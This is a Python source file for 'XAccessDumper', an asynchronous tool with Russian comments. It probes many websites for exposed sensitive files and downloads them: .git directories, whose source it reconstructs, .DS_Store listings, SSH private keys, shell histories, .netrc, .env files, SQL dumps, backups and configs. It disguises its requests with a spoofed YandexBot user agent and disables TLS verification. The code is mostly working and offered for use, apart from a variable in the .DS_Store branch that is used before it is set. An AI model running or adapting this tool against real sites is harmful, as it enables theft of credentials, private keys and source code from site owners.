# TODO: реализовать сканирование листинга файлов на сервере
__all__ = ('XAccessDumper',)

import asyncio
import dataclasses
import io
import itertools
import re
import typing
from contextlib import asynccontextmanager
from os import access
from pathlib import Path
from urllib.parse import unquote, urljoin, urlparse

import aiohttp
from aiohttp.typedefs import LooseHeaders
from ds_store import DSStore, buddy

from .logger import logger
from .utils import read_struct

COMMON_GIT_FILENAMES = [
    'COMMIT_EDITMSG',
    'FETCH_HEAD',
    'HEAD',
    'ORIG_HEAD',
    # 'config',
    'description',
    'index',
    'info/exclude',
    'logs/HEAD',
    'objects/info/packs',
    'packed-refs',
]

SHA1_RE = re.compile(r'\b[a-f\d]{40}\b')
REF_RE = re.compile(r'\brefs/\S+')

SHA1_OR_REF_RE = re.compile(
    '(?P<sha1>' + SHA1_RE.pattern + ')|(?P<ref>' + REF_RE.pattern + ')'
)

SCRIPT_EXTS = (
    '.php',
    '.php3',
    '.php4',
    '.php5',
    '.php7',
    '.pl',
    '.jsp',
    '.asp',
    '.cgi',
    '.exe',
)

EXTENSION_RE = re.compile(r'\.[a-z]{1,4}[0-9]?$', re.I)

DOT_FILENAMES = (
    '.bashrc',
    '.zshrc',
    '.bash_history',
    '.zsh_history',
    '.netrc',
    '.ssh/id_rsa',
    '.ssh/id_rsa.pub',
    '.ssh/id_ed25519',
    '.ssh/id_ed25519.pub',
    # TODO: add more...
)

BACKUP_DIRS = ('', 'backup', 'backups', 'dump', 'dumps')

BACKUP_NAMES = ('docroot', 'www', 'site', 'backup', '{host}')

BACKUP_EXTS = ('.zip', '.tar.gz', '.tgz', '.tar', '.tar.gz')

SQL_DIRS = (*BACKUP_DIRS, 'sql', 'db', 'database')

SQL_NAMES = ('dump', 'db', 'database')

DEPLOY_DIRS = ('', 'docker', 'application', 'app', 'api')

DEPLOY_FILENAMES = ('.env', 'prod.env', 'Dockerfile', 'docker-compose.yml')

CONFIG_DIRS = ('', 'conf', 'config')

CONFIG_NAMES = ('conf', 'config', 'db', 'database')

CONFIG_EXTS = ('.cfg', '.conf', '.ini')

EDIT_FILENAMES = ('index.php', 'wp-config.php', 'conf/db.php')
EDIT_SUFFIXES = ('1', '~', '.bak')


@dataclasses.dataclass
class XAccessDumper:
    _: dataclasses.KW_ONLY
    exclude_pattern: re.Pattern | str | None = None
    headers: LooseHeaders | None = None
    num_workers: int = 50
    output_directory: str | Path = 'output'
    override_existing: bool = False
    timeout: float = 15.0
    user_agent: str = (
        "Mozilla/5.0"
        " (compatible; YandexBot/3.0; +http://yandex.com/bots)"
        " AppleWebKit/537.36 (KHTML, like Gecko)"
        " Chrome/81.0.4044.268"
    )

    def __post_init__(self) -> None:
        if self.exclude_pattern and not isinstance(
            self.exclude_pattern, re.Pattern
        ):
            self.exclude_pattern = re.compile(self.exclude_pattern)
        if isinstance(self.output_directory, str):
            self.output_directory = Path(self.output_directory)
        if not isinstance(self.timeout, aiohttp.ClientTimeout):
            self.timeout = aiohttp.ClientTimeout(self.timeout)

    def normalize_url(self, url: str) -> str:
        if '://' not in url:
            url = f'http://{url}'
        if not url.endswith('/'):
            url += '/'
        return url

    async def run(self, urls: typing.Sequence[str]) -> None:
        queue = asyncio.Queue()
        normalized_urls = list(map(self.normalize_url, urls))

        # Проверяем есть ли /.git/index
        for url in normalized_urls:
            queue.put_nowait(urljoin(url, '.git/index'))
            queue.put_nowait(urljoin(url, '.DS_Store'))
            for filename in DOT_FILENAMES:
                queue.put_nowait(urljoin(url, filename))
            host = urlparse(url).netloc
            for dirname, name, ext in itertools.product(
                BACKUP_DIRS, BACKUP_NAMES, BACKUP_EXTS
            ):
                filename = f'{dirname}/{name}{ext}'
                filename = filename.format(host=host).lstrip('/')
                queue.put_nowait(urljoin(url, filename))
            for dirname, name in itertools.product(SQL_DIRS, SQL_NAMES):
                filename = f'{dirname}/{name}.sql'
                queue.put_nowait(urljoin(url, filename.lstrip('/')))
            for dirname, filename in itertools.product(
                DEPLOY_DIRS, DEPLOY_FILENAMES
            ):
                filename = f'{dirname}/{filename}'
                queue.put_nowait(urljoin(url, filename.lstrip('/')))
            for dirname, name, ext in itertools.product(
                CONFIG_DIRS, CONFIG_NAMES, CONFIG_EXTS
            ):
                filename = f'{dirname}/{name}{ext}'
                queue.put_nowait(urljoin(url, filename.lstrip('/')))
            for filename, suffix in itertools.product(
                EDIT_FILENAMES, EDIT_SUFFIXES
            ):
                queue.put_nowait(urljoin(url, f'{filename}{suffix}'))

        # Посещенные ссылки
        seen_urls = set()

        # Запускаем задания в фоне
        workers = [
            asyncio.create_task(self.worker(queue, seen_urls))
            for _ in range(self.num_workers)
        ]

        # Ждем пока очередь станет пустой
        await queue.join()

        # Останавливаем задания
        for _ in range(self.num_workers):
            await queue.put(None)

        for w in workers:
            await w

        for url in normalized_urls:
            await self.retrieve_source_code(self.url2localpath(url + '.git'))

    async def worker(self, queue: asyncio.Queue, seen_urls: set[str]) -> None:
        async with self.get_session() as session:
            while True:
                try:
                    download_url = await queue.get()

                    if download_url is None:
                        break

                    if download_url in seen_urls:
                        logger.debug("already seen %s", download_url)
                        continue

                    seen_urls.add(download_url)

                    # "https://example.org/Old%20Site/.git/index" -> "output/example.org/Old Site/.git/index"
                    file_path = self.url2localpath(download_url)

                    if self.exclude_pattern and self.exclude_pattern.search(
                        file_path.name
                    ):
                        logger.debug("exclude file: %s", file_path)
                        continue

                    if self.override_existing or not file_path.exists():
                        try:
                            await self.download_file(
                                session, download_url, file_path
                            )
                        except Exception as e:
                            if isinstance(e, aiohttp.ClientResponseError):
                                logger.warn(
                                    "%d: %s - %s",
                                    e.status,
                                    e.message,
                                    e.request_info.url,
                                )
                            else:
                                logger.error("error: %s", e)
                            if file_path.exists():
                                logger.debug("delete: %s", file_path)
                                file_path.unlink()
                            continue
                    else:
                        logger.debug("file exists: %s", file_path)
                    if file_path.name == '.DS_Store':
                        await self.parse_ds_store(file_path, git_url, queue)
                    elif (pos := download_url.rfind('.git/')) != -1:
                        git_url = download_url[: pos + len('.git/')]
                        await self.parse_git_file(file_path, git_url, queue)
                    elif file_path.name == '.gitignore':
                        await self.parse_gitignore(
                            file_path, download_url, queue
                        )
                except Exception as ex:
                    logger.error("an unexpected error has occurred: %s", ex)
                finally:
                    queue.task_done()

    async def parse_ds_store(
        self, file_path: Path, download_url: str, queue: asyncio.Queue
    ) -> None:
        with file_path.open('rb') as fp:
            try:
                # TODO: разобраться как определить тип файла
                # https://wiki.mozilla.org/DS_Store_File_Format
                filenames = set(entry.filename for entry in DSStore.open(fp))
            except buddy.BuddyError:
                logger.error("invalid format: %s", file_path)
                file_path.unlink()
                return
        for filename in filenames:
            if not self.is_web_accessible(filename):
                continue
            await queue.put(
                urljoin(
                    download_url,
                    # Если файл выглядит как каталог проверяем есть ли в нем
                    # .DS_Store
                    filename
                    if EXTENSION_RE.search(filename)
                    else f'{filename}/.DS_Store',
                )
            )

    async def parse_git_file(
        self,
        file_path: Path,
        git_url: str,
        queue: asyncio.Queue,
    ) -> None:
        if file_path.name == 'index':
            # https://git-scm.com/docs/index-format
            hashes = []
            filenames = []
            with file_path.open('rb') as fp:
                sig, ver, num_entries = read_struct(fp, '!4s2I')
                assert sig == b'DIRC'
                assert ver in (2, 3, 4)
                assert num_entries > 0
                logger.debug("num entries: %d", num_entries)
                while num_entries:
                    entry_size = fp.tell()
                    fp.seek(40, io.SEEK_CUR)  # file attrs
                    # 20 байт - хеш, 2 байта - флаги
                    # имя файла может храниться в флагах, но не видел такого
                    sha1 = fp.read(22)[:-2].hex()
                    assert len(sha1) == 40
                    hashes.append(sha1)
                    filename = b''
                    while (c := fp.read(1)) != b'\0':
                        assert c != b''  # Неожиданный конец
                        filename += c
                    filename = filename.decode()
                    filenames.append(filename)
                    logger.debug("%s %s", sha1, filename)
                    entry_size -= fp.tell()
                    # Размер entry кратен 8 (добивается NULL-байтами)
                    fp.seek(entry_size % 8, io.SEEK_CUR)
                    # Есть еще extensions, но они нигде не используются
                    num_entries -= 1
            for filename in COMMON_GIT_FILENAMES:
                await queue.put(urljoin(git_url, filename))
            for sha1 in hashes:
                await queue.put(
                    urljoin(git_url, self.get_object_filename(sha1))
                )
            # Пробуем скачать файлы напрямую, если .git не получится
            # восстановить, то, возможно, повезет с db.ini
            for filename in filenames:
                if self.is_web_accessible(filename):
                    # /.git + file = /file
                    await queue.put(urljoin(git_url[:-1], filename))

        elif file_path.name == 'packs':
            # Содержит строки вида "P <hex>.pack"
            contents = file_path.read_text()
            for sha1 in SHA1_RE.findall(contents):
                for ext in ('idx', 'pack'):
                    await queue.put(
                        urljoin(git_url, f'objects/pack/pack-{sha1}.{ext}')
                    )
        elif not re.fullmatch(
            r'(pack-)?[a-f\d]{38}(\.(idx|pack))?', file_path.name
        ):
            for match in SHA1_OR_REF_RE.finditer(file_path.read_text()):
                group = match.groupdict()
                if group['sha1']:
                    await queue.put(
                        urljoin(
                            git_url,
                            self.get_object_filename(group['sha1']),
                        )
                    )
                    continue
                for directory in ('', 'logs/'):
                    await queue.put(
                        urljoin(git_url, f"{directory}{group['ref']}")
                    )

    async def parse_gitignore(
        self, file_path: Path, download_url: str, queue: asyncio.Queue
    ) -> None:
        filenames = []
        with file_path.open('r') as fp:
            for filename in fp:
                filename = filename.split('#')[0].strip()
                if not filename:
                    continue
                # Паттерны вида: `*.py[co]`
                if any(c in filename for c in '*[]'):
                    continue
                if filename.startswith('/'):
                    filename = filename[1:]
                # TODO: добавить больше кейсов
                if filename.rstrip('/') == '.vscode':
                    filenames.extend(
                        ['.vscode/settings.json', '.vscode/launch.json']
                    )
                else:
                    filenames.append(filename)
        for filename in filenames:
            if self.is_web_accessible(filename):
                await queue.put(urljoin(download_url, filename))

    async def retrieve_source_code(self, git_path: Path) -> None:
        cmd = (
            f"git --git-dir='{git_path}'"
            f" --work-tree='{git_path.parent}'"
            ' checkout -- .'
        )
        logger.debug("run: %r", cmd)
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.PIPE,
        )
        _, stderr = await proc.communicate()
        if proc.returncode == 0:
            logger.info("source retrieved: %s", git_path)
        else:
            logger.error(stderr.decode())
            logger.error("can't retrieve source: %s", git_path)

    async def download_file(
        self,
        session: aiohttp.ClientSession,
        download_url: str,
        file_path: Path,
    ) -> None:
        response: aiohttp.ClientResponse
        async with session.get(download_url, allow_redirects=False) as response:
            response.raise_for_status()
            file_path.parent.mkdir(parents=True, exist_ok=True)
            with file_path.open('wb') as fp:
                async for chunk in response.content.iter_chunked(8192):
                    fp.write(chunk)
        logger.info("downloaded: %s", download_url)

    @asynccontextmanager
    async def get_session(self) -> typing.AsyncIterable[aiohttp.ClientSession]:
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(verify_ssl=False),
            headers=self.headers,
            timeout=self.timeout,
        ) as session:
            session.headers.setdefault('User-Agent', self.user_agent)
            yield session

    def get_object_filename(self, sha1: str) -> str:
        return f'objects/{sha1[:2]}/{sha1[2:]}'

    def is_web_accessible(self, filename: str) -> bool:
        return not filename.lower().endswith(SCRIPT_EXTS)

    def url2localpath(self, download_url: str) -> Path:
        return self.output_directory.joinpath(
            unquote(download_url.split('://')[1])
        )
